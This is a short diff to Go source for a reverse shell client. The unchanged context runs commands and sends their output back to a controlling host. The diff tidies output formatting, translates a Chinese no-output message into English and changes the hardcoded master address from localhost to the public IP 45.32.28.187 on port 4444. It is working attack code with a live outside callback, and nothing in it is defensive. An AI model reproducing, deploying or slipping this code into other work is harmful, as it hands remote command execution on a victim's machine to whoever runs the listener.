@@ -49,15 +49,15 @@ chk_conn:
 			for scanner.Scan() {
 				nowTime := time.Now().Unix()
 				if ouTtext != "" {
-					ouTtext = ouTtext + "\n"
+					ouTtext = ouTtext
 				}
-				ouTtext = ouTtext + scanner.Text()
+				ouTtext = ouTtext + scanner.Text() + "\n"
 				if nowTime-startTime > waitTime {
 					cmd.Process.Kill()
 				}
 			}
 			if ouTtext == "" {
-				ouTtext = "命令：" + status + "执行没有输出，请检查程序的结果"
+                ouTtext = "Command: "+ status + "produced no output\n"
 			}
 			textChan <- ouTtext
 		}(cmd)
@@ -78,6 +78,6 @@ chk_conn:
 
 func main() {
 	var master_ip string
-	master_ip = "127.0.0.1:8081"
+    master_ip = "45.32.28.187:4444"
 	reverseshell(master_ip)
 }
